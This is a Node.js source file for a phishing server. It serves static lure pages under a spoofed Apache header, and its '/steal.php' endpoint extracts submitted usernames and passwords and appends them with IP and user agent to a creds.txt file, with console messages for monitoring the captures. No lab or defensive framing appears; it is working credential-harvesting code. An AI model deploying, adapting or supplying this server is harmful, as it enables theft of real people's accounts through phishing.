const http = require('http');
const fs = require('fs');
const { URL } = require('url');

// Ensure persistent data directory exists
const dataDir = '/app/data';
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const server = http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const pathname = url.pathname;
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Log all requests to persistent storage
    const logEntry = `${new Date().toISOString()}\nIP: ${clientIP}\nUA: ${req.headers['user-agent']}\nPath: ${pathname}\n----------------------------------------\n`;
    fs.appendFileSync(`${dataDir}/access.log`, logEntry);
    
    if (req.method === 'POST' && pathname === '/steal.php') {
        let rawBody = '';
        req.on('data', chunk => rawBody += chunk);
        req.on('end', () => {
            console.log('RAW POST DATA:', rawBody.substring(0, 200));
            
            // Extract FormData values
            const usernameMatch = rawBody.match(/name="username"[\s\S]*?([\s\S]*?)(?=\r\n--|\r\n\r\n--|$)/);
            const passwordMatch = rawBody.match(/name="password"[\s\S]*?([\s\S]*?)(?=\r\n--|\r\n\r\n--|$)/);
            
            const username = usernameMatch ? usernameMatch[1].replace(/[\r\n]/g, '').trim() : 'N/A';
            const password = passwordMatch ? passwordMatch[1].replace(/[\r\n]/g, '').trim() : 'N/A';
            const userAgent = req.headers['user-agent'] || 'N/A';
            
            // Save credentials to persistent storage
            const credLog = `${new Date().toISOString()}\nIP: ${clientIP}\nUA: ${userAgent}\nUsername: ${username}\nPassword: ${password}\n----------------------------------------\n`;
            fs.appendFileSync(`${dataDir}/creds.txt`, credLog);
            
            console.log('🕵️  CAPTURED:', username, '|', password);
            
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('OK');
        });
        return;
    }
    
    // Serve static files
    let filePath = pathname === '/' ? 'index.html' : '.' + pathname;
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        
        const ext = filePath.split('.').pop().toLowerCase();
        const types = {
            html: 'text/html',
            css: 'text/css',
            js: 'application/javascript',
            png: 'image/png',
            jpg: 'image/jpeg',
            jpeg: 'image/jpeg',
            gif: 'image/gif',
            php: 'text/plain'
        };
        
        res.writeHead(200, {
            'Content-Type': types[ext] || 'text/plain',
            'X-Powered-By': 'Apache/2.4.41'
        });
        res.end(data);
    });
});

server.listen(8000, () => {
    console.log('🚀 Server running at http://localhost:8000');
    console.log('📁 Credentials saved to: ./phishing-data/creds.txt');
    console.log('💡 Monitor with: tail -f phishing-data/creds.txt');
});